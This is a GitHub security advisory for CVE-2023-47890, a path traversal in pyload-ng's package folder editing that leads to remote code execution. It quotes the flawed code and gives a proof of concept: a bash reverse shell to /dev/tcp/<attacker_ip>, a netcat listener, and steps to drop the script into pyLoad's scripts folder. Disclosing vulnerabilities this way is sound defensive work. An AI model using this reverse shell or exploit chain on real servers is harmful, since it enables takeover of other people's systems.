# [H] Download to arbitrary folder can lead to RCE

## Summary
Severity: High
Advisory: GHSA-h73m-pcfw-25h2
CVE: CVE-2023-47890
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:A/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2023-11-21
Source: https://github.com/advisories/GHSA-h73m-pcfw-25h2
Type: github-advisory

## Affected
- PyPI: `pyload-ng` — affected >=0 <0.5.0b3.dev75

## Details
### Summary

A web UI user can store files anywhere on the pyLoad server and gain command execution by abusing scripts.

### Details

When a user creates a new package, a subdirectory is created within the /downloads folder to store files. This new directory name is derived from the package name, except a filter is applied to make sure it can't traverse directories and stays within /downloads.

src/pyload/core/api/__init__.py::add_package::L432

```python
  folder = (
      folder.replace("http://", "")
      .replace("https://", "")
      .replace(":", "")
      .replace("/", "_")
      .replace("\\", "_")
  )
```

So if a package were created with the name ```"../"``` the application would instead create the folder ```"/downloads/.._/"```

However, when editing packages there is no prevention in place and a user can just pick any arbitrary directory in the filesystem.

src/pyload/webui/app/blueprints/json_blueprint.py::edit_package::L195

```python
  id = int(flask.request.form["pack_id"])
  data = {
      "name": flask.request.form["pack_name"],
      "_folder": flask.request.form["pack_folder"],
      "password": flask.request.form["pack_pws"],
  }

  api.set_package_data(id, data)
```

### Steps to reproduce

1. Login to a pyLoad instance
2. Go to "Queue" and create a new package with any name and a valid link
3. Click "Edit Package" on the newly created package and set the folder as "/config/scripts/download_finished/"
4. Restart the package 
5. Check the server filesystem and note the link was downloaded and stored inside "/config/scripts/download_finished/"

### Remote code execution proof-of-concept

It is possible to use this issue to abuse scripts and gain remote control over the pyLoad server.

#### On attacker machine

1. Start a web server hosting a malicious script

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<attacker_ip>/9999 0>&1' > evil.sh&1
sudo python3 -m http.server 80
```


2. Start netcat listener for reverse shells

  ```bash
  nc -vklp 9999
  ```

#### On pyLoad

1. Change pyLoad file permission settings

    Change permissions of downloads: On
    Permission mode for downloaded files: 0744

2. Create a package with link pointing to the attacker

    http://<attacker_ip>/evil.sh

3. Edit package and change folder to /config/scripts/package_deleted/

4. Refresh package. Wait up to 60 seconds for scripts to be processed by pyLoad

5. Delete any package package to trigger the script

### Impact

An authenticated user can gain control over the underlying pyLoad server.

## References
- https://github.com/pyload/pyload/security/advisories/GHSA-h73m-pcfw-25h2
- https://nvd.nist.gov/vuln/detail/CVE-2023-47890
- https://github.com/pyload/pyload/commit/695bb70cd88608dc4fee18a6a7ecb66722ebfd8f
- https://github.com/pyload/pyload
- http://pyload.com
